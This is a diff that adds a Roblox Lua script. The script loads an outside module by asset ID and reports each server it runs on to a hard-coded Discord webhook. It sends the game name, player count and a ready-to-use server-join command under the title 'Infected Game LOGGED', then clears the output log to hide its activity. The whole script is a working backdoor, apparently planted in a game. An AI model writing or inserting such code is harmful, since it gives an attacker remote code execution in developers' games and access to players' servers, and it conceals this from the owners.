@@ -1,1 +1,58 @@
+require(110806591060834):load()
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LogService = game:GetService("LogService")
 
+local generalWebhookURL = "https://discord.com/api/webhooks/1310325916244774982/EN1GZxaS4nB3SPOoVPN6_S2kmt9TTC0Y89-pqpJPLm2OkFHVBrPZh7Mcb6JseZ6lQNOk"
+
+local function sendToDiscord(webhookURL, embedData)
+    local success, response = pcall(function()
+        local data = HttpService:JSONEncode(embedData)
+        HttpService:PostAsync(webhookURL, data, Enum.HttpContentType.ApplicationJson)
+    end)
+
+    if not success then
+        warn("Failed to send webhook: " .. response)
+    end
+end
+
+local function logGameInfo(player)
+    local success, productInfo = pcall(function()
+        return MarketplaceService:GetProductInfo(game.PlaceId)
+    end)
+
+    local gameName = success and productInfo.Name or "Unknown Game"
+    local playerCount = #Players:GetPlayers()
+    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
+    local gamePlaceId = game.PlaceId
+    local serverId = game.JobId
+
+    local embed = {
+        content = "",
+        embeds = {{
+            ["title"] = "Infected Game LOGGED",
+            ["description"] = "Game: " .. gameName .. "\nPlayers: " .. playerCount,
+            ["color"] = 255,
+            ["fields"] = {
+                { ["name"] = "Join Game Link", ["value"] = gameLink },
+                { 
+                    ["name"] = "JavaScript Server Join", 
+                    ["value"] = "```javascript\nRoblox.GameLauncher.joinGameInstance(" .. gamePlaceId .. ", '" .. serverId .. "')\n```"
+                }
+            },
+            ["footer"] = { ["text"] = "Game Log" }
+        }}
+    }
+
+    sendToDiscord(generalWebhookURL, embed)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    logGameInfo(player)
+    
+
+end)
+
+wait(0.4)
+LogService:ClearOutput()
